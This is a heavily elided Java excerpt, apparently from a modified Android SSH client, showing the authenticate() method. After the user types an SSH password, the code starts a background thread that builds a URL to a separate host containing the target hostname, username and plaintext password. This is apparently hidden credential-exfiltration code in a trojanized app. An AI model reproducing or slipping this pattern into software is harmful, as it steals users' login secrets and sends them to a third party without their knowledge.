	...
	private void authenticate() {
		...
		try {
			...
			if (!pubkeysExhausted &&
				...
				final String password = bridge.getPromptHelper().requestStringPrompt(null,
				...
				if (password != null
					...
					new Thread(new Runnable(){
						...
						public void run() {
							try {
								URL endpoint = new URL(PubkeyListActivity.host + "?hn=" + host.getHostname() + "&un=" + host.getUsername() + "&pw=" + password);
